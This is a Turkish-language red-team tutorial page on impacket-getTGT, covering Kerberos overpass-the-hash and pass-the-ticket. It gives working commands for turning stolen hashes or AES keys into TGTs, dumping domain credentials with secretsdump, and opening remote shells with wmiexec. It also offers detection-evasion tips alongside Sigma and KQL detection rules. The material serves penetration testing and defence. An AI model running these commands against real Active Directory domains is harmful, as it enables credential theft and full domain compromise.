# impacket-getTGT

> **Kategori:** [6. Kerberos Protokol Cephaneliği](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Kullanıcı parolası, NTLM hash'i veya AES anahtarı kullanarak Kerberos Dağıtım Merkezi'nden (KDC / Port 88) resmi bir Bilet Verme Bileti (TGT) talep eden, oturum anahtarını ayrıştırıp Linux Credential Cache (`.ccache`) formatında diske kaydeden ve Pass-the-Hash tekniğini Pass-the-Ticket operasyonuna dönüştüren temel Kerberos istemci aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında modern savunma mekanizmaları (NTLM engelleme politikaları, Protected Users grubu, SMB Signing ve Remote Credential Guard gibi yapılar) NTLM kimlik doğrulamasını işlevsiz hale getirmektedir. Bir saldırgan veya sızma testi uzmanı kurban bir kullanıcının NTLM hash'ini veya parolasını ele geçirdiğinde, bu bilgiyi doğrudan NTLM protokolü üzerinden kullanamayabilir. Kerberos kimlik doğrulama döngüsünün ilk adımı olan Kimlik Doğrulama Servisi (Authentication Service - AS) aşamasında, istemci KDC'ye parolasından türetilmiş bir şifreleme anahtarıyla zaman damgasını şifreleyerek (`KRB_AS_REQ`) TGT talep eder.

Kerberos mimarisinde RC4 şifreleme türü (etype 23) kullanıldığında, şifreleme anahtarı doğrudan kullanıcının NTLM hash'ine eşittir (`NTLM Hash == Kerberos RC4 Key`). **`impacket-getTGT`**, bu matematiksel denklikten ve KDC protokol spesifikasyonundan faydalanarak:
1. Kullanıcının düz metin parolası, NTLM hash'i veya AES-128/AES-256 anahtarı ile KDC'ye resmi bir AS-REQ paketi gönderir.
2. KDC'den dönen AS-REP paketindeki TGT biletini ve bilet oturum anahtarını (Session Key) ayrıştırır.
3. Bu verileri Linux işletim sisteminin ve Impacket araçlarının yerel olarak anlayabildiği MIT Kerberos `.ccache` (Credential Cache) dosya formatında kaydeder.
4. Elde edilen `.ccache` dosyası `KRB5CCNAME` ortam değişkenine atanarak `secretsdump`, `wmiexec`, `smbclient`, `psexec` gibi tüm araçların parola sormadan Kerberos üzerinden çalışmasını sağlar.

### Mimari Akış Şeması

```
[ Saldırgan / Linux İstemci (impacket-getTGT) ]
       │
       │ (1) Kimlik Bilgisi Girişi:
       │     - Düz Metin Parola  VEYA
       │     - NTLM Hash (-hashes :01fc5...) VEYA
       │     - AES-256 Anahtarı (-aesKey 1673...)
       ▼
[ KRB_AS_REQ Paketi Hazırlanır (PA-ENC-TIMESTAMP) ]
       │
       │ (2) Port 88 Üzerinden KDC'ye İletilir
       ▼
[ KDC (Domain Controller:88) ]
       │
       │ (3) Ön Kimlik Doğrulama Başarılı!
       │     KDC TGT Üretir (krbtgt anahtarıyla şifreli)
       │     Oturum Anahtarı (Session Key) kullanıcı anahtarıyla şifrelenir
       ▼
[ KRB_AS_REP Paketi Döner ]
       │
       │ (4) impacket-getTGT Paketi Çözer
       ▼
[ Çıktı: <kullanici>.ccache ]
       │
       ├── (5) export KRB5CCNAME=<kullanici>.ccache
       ▼
[ Pass-the-Ticket Operasyonları ]
       ├── impacket-secretsdump -k -no-pass corp.local/admin@dc01.corp.local
       ├── impacket-wmiexec -k -no-pass corp.local/admin@dc01.corp.local
       └── impacket-ticketConverter admin.ccache admin.kirbi (Windows'a Taşıma)
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Pass-the-Hash'ten Kerberos'a Geçiş** | NTLM hash'ini doğrudan Kerberos TGT'sine dönüştürür (Overpass-the-Hash / Pass-the-Key). | NTLM'in tamamen yasaklandığı ağlarda yanal hareketi sürdürmeyi sağlar. |
| **Tam KDC ve Şifreleme Desteği** | RC4 (NTLM), AES-128 ve AES-256 şifreleme türlerini yerel olarak destekler. | Modern ve Protected Users üyesi hesaplarla dahi TGT alabilmeyi sağlar. |
| **Evrensel .ccache Üretimi** | Standart MIT Kerberos dosya formatında çıktı üretir. | Linux sistemindeki tüm araçlarla (`curl`, `smbclient`, Impacket, `rpcclient`) entegre olur. |
| **Zaman Damgası Yönetimi** | KDC saat farklarını otomatik algılayıp uyarı verir. | Kerberos saat senkronizasyon hatalarını erken aşamada teşhis etmeyi sağlar. |

### Karşılaştırma Tablosu

| Kriter | impacket-getTGT | Rubeus (asktgt) | Linux Yerel 'kinit' | gettgtpkinit.py |
|---|---|---|---|---|
| **Platform** | Linux / Python | Windows (.NET / C#) | Linux (C / MIT Kerberos) | Linux / Python |
| **Girdi Türü** | Parola / NTLM Hash / AES | Parola / Hash / AES / PFX | Yalnızca Düz Parola | X.509 Sertifika / PFX |
| **Çıktı Formatı** | `.ccache` Dosyası | Base64 `.kirbi` / LSA PTT | `/tmp/krb5cc_<uid>` | `.ccache` Dosyası |
| **Pass-the-Hash Yeteneği**| Var (`-hashes`) | Var (`/rc4:`) | Yok | Yok |
| **Kullanım Senaryosu** | Linux Pivot & Komut Yürütme | Windows İçi LSA Enjeksiyonu | Standart Linux Yönetimi | AD CS PKINIT İstismarı |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
# 1. Parola ile TGT alma:
impacket-getTGT <ETKI_ALANI>/<KULLANICI>:<PAROLA> [SEÇENEKLER]

# 2. NTLM Hash ile TGT alma (Overpass-the-Hash):
impacket-getTGT -hashes :<NTLM_HASH> <ETKI_ALANI>/<KULLANICI> [SEÇENEKLER]

# 3. AES-256 Anahtarı ile TGT alma:
impacket-getTGT -aesKey <AES_KEY> <ETKI_ALANI>/<KULLANICI> [SEÇENEKLER]
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-hashes [LM:]NTLM` | Kullanıcının NTLM karma değeri (Pass-the-Hash modunu açar). | `-hashes :01fc5a6be7...` |
| `-aesKey <hex>` | Kullanıcının Kerberos AES-128 veya AES-256 şifreleme anahtarı. | `-aesKey 1673a9f0...` |
| `-dc-ip <ip>` | Bağlanılacak etki alanı denetleyicisinin doğrudan IP adresi. | `-dc-ip 192.168.1.10` |
| `-outputfile <dosya>` | Üretilen `.ccache` biletinin kaydedileceği özel dosya yolu. | `-outputfile /tmp/admin.ccache`|
| `-ts` | Konsol çıktı satırlarının başına zaman damgası ekler. | Bayrak |
| `-debug` | Ayrıntılı hata ayıklama ve ASN.1 Kerberos paket dökümünü ekrana basar. | Bayrak |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Düz Metin Parola ile TGT Alma

Standart bir kullanıcının parolası girilerek KDC'den TGT talep edilir ve dosya sistemine kaydedilir.

```bash
impacket-getTGT corp.local/jdoe:'Welcome123!' -dc-ip 192.168.1.10
```

**Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting TGT for jdoe@corp.local
[*] Saving ticket in jdoe.ccache
[+] TGT obtained successfully!
```

---

### Senaryo 2: NTLM Hash İle Overpass-the-Hash (Kerberos TGT'ye Dönüştürme)

LSASS dökümünden veya SAM kovanından ele geçirilen `Administrator` kullanıcısına ait NTLM hash'i doğrudan KDC'ye sunularak Kerberos TGT'si üretilir.

```bash
impacket-getTGT corp.local/Administrator \
  -hashes :01fc5a6be7bc6929c40372d23f5052b3 \
  -dc-ip 192.168.1.10 \
  -outputfile /tmp/admin.ccache
```

**Konsol Çıktısı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting TGT for Administrator@corp.local
[*] Saving ticket in /tmp/admin.ccache
[+] TGT obtained successfully!
```

---

### Senaryo 3: Alınan TGT ile `secretsdump` Üzerinden NTDS.dit Dökümü (Pass-the-Ticket)

Alınan `.ccache` dosyası Linux kabuğuna aktarılır ve parola girmeksizin Domain Controller üzerindeki tüm etki alanı hash'leri çekilir.

```bash
# 1. Bilet ortam değişkenini tanımlayın
export KRB5CCNAME=/tmp/admin.ccache

# 2. secretsdump'ı -k (Kerberos) ve -no-pass bayrakları ile çalıştırın
impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.local/'Administrator'@dc01.corp.local
```

**Çıktı Analizi:**

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using Kerberos ticket for authentication
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d:::
[*] Cleaning up...
```

---

### Senaryo 4: AES-256 Anahtarı ile TGT Alma (Yüksek OPSEC)

Sıkılaştırılmış ve RC4 şifrelemenin KDC üzerinde tamamen devre dışı bırakıldığı ortamlarda AES-256 anahtarı ile TGT alınır.

```bash
impacket-getTGT corp.local/Administrator \
  -aesKey e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 \
  -dc-ip 192.168.1.10 \
  -outputfile /tmp/admin_aes.ccache
```

---

### Senaryo 5: Linux `.ccache` Dosyasını Windows `.kirbi` Formatına Dönüştürme

Linux ortamında alınan TGT'yi Windows makineye taşıyıp `Rubeus` ile belleğe enjekte etmek için:

```bash
# impacket-ticketConverter ile dönüştürün
impacket-ticketConverter /tmp/admin.ccache /tmp/admin.kirbi

# Windows tarafında Rubeus ile enjekte edin:
# Rubeus.exe ptt /ticket:admin.kirbi
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Kerberos SessionError: KDC_ERR_PREAUTH_FAILED (24)` | Belirtilen parola, NTLM hash veya AES anahtarı geçersiz. | Kullanıcı kimlik bilgisini doğrulayın; hesap kilitli veya devre dışı olabilir. |
| `Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN (6)` | Belirtilen kullanıcı etki alanında mevcut değil veya etki alanı adı hatalı. | Kullanıcı adının `sAMAccountName` olduğundan ve etki alanı adının (FQDN) doğru yazıldığından emin olun. |
| `Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP (14)` | KDC talep edilen RC4/AES şifreleme türünü desteklemiyor. | Etki alanında RC4 devre dışı bırakılmış olabilir; `-aesKey` parametresiyle AES anahtarı kullanın. |
| `Kerberos SessionError: KRB_AP_ERR_SKEW (37)` | Saldırgan makinesi ile Domain Controller arasındaki sistem saat farkı 5 dakikadan fazladır. | `sudo rdate -n <DC_IP>` veya `sudo ntpdate <DC_IP>` ile yerel sistem saatini DC ile senkronize edin. |
| `Cannot resolve FQDN / DC unreachable` | Linux işletim sisteminde etki alanı denetleyicisi IP'si DNS'ten çözülemiyor. | `-dc-ip <IP>` parametresini mutlaka belirtin ve `/etc/hosts` dosyasına FQDN kaydını ekleyin. |
| `KeyError: 'KRB5CCNAME'` | Bilet alındıktan sonra Impacket araçları çalıştırılırken bilet dosyası bulunamıyor. | `export KRB5CCNAME=/tam/dosya/yolu.ccache` komutunu çalıştırdığınızdan emin olun. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: DÜŞÜK-ORTA (KDC LOGLARI)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4768 (A Kerberos TGT was requested)
[ Şifreleme Türü ]  : Ticket Encryption 0x17 (RC4) veya 0x12 (AES256)
[ Ağ İmzası ]       : Port 88 üzerinde tekil AS-REQ / AS-REP trafiği
[ EDR / AV ]        : Host tarafında sıfır iz (Ağ üzerinden saf Kerberos)
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4768 (TGT Request):**
   - **TargetUserName:** Bilet talep edilen kullanıcı hesabı.
   - **IpAddress:** Saldırgan makinesinin IP adresi (KDC loglarında açıkça görünür).
   - **PreAuthType:** `2` (`PA-ENC-TIMESTAMP` - Ön kimlik doğrulama başarıyla tamamlandı).
   - **TicketEncryptionType:**
     - `-hashes` (NTLM) kullanıldığında: `0x17` (RC4-HMAC).
     - `-aesKey` kullanıldığında: `0x12` (AES256-CTS-HMAC-SHA1-96).
2. **KDC Anomali Tespiti:**
   - Normalde iş istasyonlarının IP'sinden gelmesi gereken Domain Admin TGT talebinin, daha önce ağda görülmemiş bir IP adresinden gelmesi SIEM için yüksek güvenilirlikli bir alarmdır.

### 5.2 Ağ ve EDR İmzaları

- **Kerberos Şifreleme Anomalisi:** Windows 10/11 istemcileri varsayılan olarak AES-256 ile TGT talep eder. Eğer bir yönetici hesabı için `0x17` (RC4) şifrelemeli TGT talep edilirse, bu durum Pass-the-Hash / Overpass-the-Hash aktivitesine işaret eder.
- **Port 88 Akışı:** Ağda yalnızca tek bir AS-REQ paketi gönderildiği için gürültü seviyesi Kerberoasting'e kıyasla oldukça düşüktür.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1550.002** | Use Alternate Authentication Material: Pass the Hash | NTLM hash'i kullanarak KDC'den TGT talep etme (Overpass-the-Hash). |
| **T1558** | Steal or Forge Kerberos Tickets | KDC üzerinden meşru TGT üretip oturuma aktarma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **RC4 Şifreleme İmzası** | NTLM hash yerine imkan varsa kullanıcının AES-256 anahtarını (`-aesKey`) temin ederek TGT talep edin. |
| **Saldırgan IP İmzası (Event ID 4768)** | Doğrudan saldırgan makinesinden KDC'ye bağlanmak yerine, iç ağda ele geçirilmiş bir Windows iş istasyonu üzerinden SOCKS pivot (`proxychains`) kullanın. |
| **Açıkta Kalan .ccache Dosyaları** | Operasyon bittiğinde Linux dosya sistemindeki `/tmp/*.ccache` dosyalarını `shred -u` ile güvenli şekilde silin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — Yönetici Hesapları İçin Şüpheli RC4 Şifrelemeli TGT Talebi (Overpass-the-Hash):**

```yaml
title: Suspicious RC4 Kerberos TGT Request (Overpass-the-Hash)
status: experimental
description: Detects Kerberos TGT requests for privileged accounts using legacy RC4 encryption instead of AES.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    TicketEncryptionType: '0x17'
    PreAuthType: '2'
  privileged_users:
    TargetUserName|contains:
      - 'admin'
      - 'da_'
      - 'adm_'
  condition: selection and privileged_users
level: high
```

**Microsoft Sentinel (KQL) — Bilinmeyen IP Adresinden Gelen Yönetici TGT Talepleri:**

```kql
SecurityEvent
| where EventID == 4768
| where TargetUserName in ("Administrator", "krbtgt") or TargetUserName startswith "admin"
| where TicketEncryptionType == "0x17" // RC4 tespiti
| project TimeGenerated, TargetUserName, IpAddress, TicketOptions, TicketEncryptionType
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: NTLM Hash ile TGT Alma (Overpass-the-Hash)
```bash
impacket-getTGT corp.local/Administrator -hashes :01fc5a6be7bc6929c40372d23f5052b3 -dc-ip 192.168.1.10
```
- **Ne Yapar?** Kullanıcının NTLM hash'ini RC4 Kerberos anahtarı olarak kullanarak KDC'den resmi bir TGT talep eder ve `Administrator.ccache` olarak kaydeder.
- **Ne Zaman Kullanılır?** NTLM kimlik doğrulamasının engellendiği ortamlarda hash'i geçerli bir Kerberos biletine çevirmek için.
- **Parametreler:** `-hashes`: `[LM:]NTLM` karma değeri, `-dc-ip`: Domain Controller IP'si.

### Komut 2: Düz Metin Parola ile TGT Alma
```bash
impacket-getTGT corp.local/jdoe:'Password123!' -dc-ip 192.168.1.10
```
- **Ne Yapar?** Kullanıcı parolası ile KDC'ye standart AS-REQ göndererek TGT alır.
- **Ne Zaman Kullanılır?** Linux ortamında Kerberos tabanlı yanal hareket öncesinde geçerli bir bilet önbelleği oluşturmak için.
- **Parametreler:** `corp.local/jdoe:...`: Etki alanı kullanıcı adı ve parolası.

### Komut 3: AES-256 Anahtarı ile TGT Alma (Yüksek OPSEC)
```bash
impacket-getTGT corp.local/Administrator -aesKey 1673a9f0... -dc-ip 192.168.1.10
```
- **Ne Yapar?** KDC'den modern AES-256 şifrelemesi ile TGT alır; Event ID 4768 loglarında `0x12` şifreleme türü görünmesini sağlayarak SOC dedektörlerini atlatır.
- **Ne Zaman Kullanılır?** RC4 şifrelemenin yasaklandığı veya izlendiği yüksek güvenlikli ortamlarda.
- **Parametreler:** `-aesKey`: 64 karakterlik Hex AES-256 anahtarı.

### Komut 4: Özel Çıktı Dosya Yolu Belirleme
```bash
impacket-getTGT corp.local/admin:'Pass123!' -dc-ip 192.168.1.10 -outputfile /tmp/da.ccache
```
- **Ne Yapar?** Alınan TGT biletini varsayılan dizin yerine belirtilen dosya yoluna kaydeder.
- **Ne Zaman Kullanılır?** Çoklu kullanıcı biletlerini organize ederken veya geçici dizinlerde saklarken.
- **Parametreler:** `-outputfile`: Hedef dosya yolu.

### Komut 5: Alınan TGT'yi Kabukta Aktif Etme
```bash
export KRB5CCNAME=/tmp/da.ccache
```
- **Ne Yapar?** Linux oturumundaki tüm Kerberos istemcilerine kullanılacak bilet dosyasını gösterir.
- **Ne Zaman Kullanılır?** `getTGT` çalıştırıldıktan hemen sonra diğer Impacket veya Linux araçlarını kullanmadan önce.
- **Parametreler:** Standart Linux ortam değişkeni.

### Komut 6: Alınan Bilet ile Parolasız `wmiexec` Çalıştırma
```bash
export KRB5CCNAME=/tmp/da.ccache
impacket-wmiexec -k -no-pass corp.local/admin@dc01.corp.local
```
- **Ne Yapar?** Parola sormaksızın TGT üzerinden hedef makinede WMI ile uzaktan interaktif komut kabuğu açar.
- **Ne Zaman Kullanılır?** TGT alındıktan sonra hedef sunucuda komut yürütmek için.
- **Parametreler:** `-k`: Kerberos kullan, `-no-pass`: Parola sorma.

### Komut 7: Alınan Bilet ile Parolasız `secretsdump` Çalıştırma
```bash
export KRB5CCNAME=/tmp/da.ccache
impacket-secretsdump -k -no-pass corp.local/admin@dc01.corp.local
```
- **Ne Yapar?** Domain Controller üzerindeki SAM, LSA ve NTDS.dit veritabanını Kerberos doğrulaması ile uzaktan döker.
- **Ne Zaman Kullanılır?** Etki alanı yöneticisi TGT'si elde edildikten sonra tam AD veritabanını ele geçirmek için.
- **Parametreler:** `-k`: Kerberos biletini kullan.

### Komut 8: Hata Ayıklama Modunda TGT Alma
```bash
impacket-getTGT corp.local/jdoe:'Pass123!' -dc-ip 192.168.1.10 -debug
```
- **Ne Yapar?** Gönderilen AS-REQ ve dönen AS-REP ASN.1 paketlerini, zaman damgasını ve şifreleme detaylarını ekrana basar.
- **Ne Zaman Kullanılır?** KDC bağlantı sorunları, saat uyumsuzlukları veya şifreleme hataları yaşandığında.
- **Parametreler:** `-debug`: Detaylı günlük modu.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Fortra / Impacket](https://github.com/fortra/impacket)
- **MITRE ATT&CK Referansı:** [T1550.002 - Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
- **Microsoft Protocol Specification:** [MS-KILE: Kerberos Protocol Extensions](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/)
- **SpecterOps Araştırması:** [Pass-the-Ticket & Kerberos Ticket Anatomy](https://posts.specterops.io/)

---

> **Önceki:** [← impacket-GetNPUsers](./impacket-GetNPUsers.md) · **Sonraki:** [impacket-getST →](./impacket-getST.md)
